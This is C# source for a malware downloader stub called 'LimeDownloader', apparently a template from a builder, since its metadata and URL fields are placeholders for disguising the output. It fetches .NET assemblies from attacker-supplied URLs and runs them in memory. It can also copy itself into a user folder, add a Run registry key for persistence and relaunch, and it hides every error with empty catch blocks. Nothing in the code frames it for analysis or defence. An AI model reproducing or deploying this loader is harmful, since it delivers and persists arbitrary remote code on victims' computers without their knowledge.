#undef INS  

using System.Collections.Generic;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
using System;
using System.Diagnostics;
using Microsoft.Win32;

[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: AssemblyVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: Guid("%Guid%")]


namespace LimeDownloader_Stubnamespace
{
    static class Stubclass
    {
      private static List<string> ListURLS = new List<string>(new string[] { "$URL$" });

        public static void Main()
        {
            #if INS
            InstallPayload();
            #endif

            while (Intrnet() == false)
            {
                Thread.Sleep(5000);
            }

            foreach (string url in ListURLS.ToArray())
            {
                try
                {
                    FetchFiles(url);
                    Thread.Sleep(2500);
                }
                catch { }
            }
        }


        private static bool Intrnet()
        {
            WebRequest request = WebRequest.Create("https://www.bing.com/");
            try
            {
                WebResponse response = request.GetResponse();
                return true;
            }
            catch { return false; }
        }


#if INS
        private static void InstallPayload()
        {
            try
            {
                string DownloaderFullPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.%DIR%), "%EXE%");
                if (Process.GetCurrentProcess().MainModule.FileName == DownloaderFullPath) return;
                FileStream Drop = null;
                if (File.Exists(DownloaderFullPath))
                    Drop = new FileStream(DownloaderFullPath, FileMode.Create);
                else
                    Drop = new FileStream(DownloaderFullPath, FileMode.CreateNew);
                byte[] Payload = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                Drop.Write(Payload, 0, Payload.Length);
                Drop.Dispose();
                Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(DownloaderFullPath), DownloaderFullPath);
                Process.Start(DownloaderFullPath);
                Thread.Sleep(50);
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
            }
        }

#endif

        private static void FetchFiles(string url)
        {
            using (WebClient wc = new WebClient())
            {
                try
                {
                    byte[] Payload = wc.DownloadData(url);
                    Thread thread = new Thread(new ParameterizedThreadStart(Execute));
                    thread.Start(Payload);
                }
                catch { }
            }
        }

        private static void Execute(object Payload)
        {
            try
            {
                Assembly asm = AppDomain.CurrentDomain.Load((byte[])Payload);
                MethodInfo Metinf = Entry(asm);
                object InjObj = asm.CreateInstance(Metinf.Name);
                object[] parameters = new object[1];
                if (Metinf.GetParameters().Length == 0)
                    parameters = null;
                MethodInfo(Metinf, InjObj, parameters);
            }
            catch { }
        }

        private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
        {
            if (meth != null)
                return meth.Invoke(obj1, obj2);
            else
                return false;
        }

        private static MethodInfo Entry(Assembly obj)
        {
            if (obj != null)
                return obj.EntryPoint;
            else
                return null;
        }

    }
}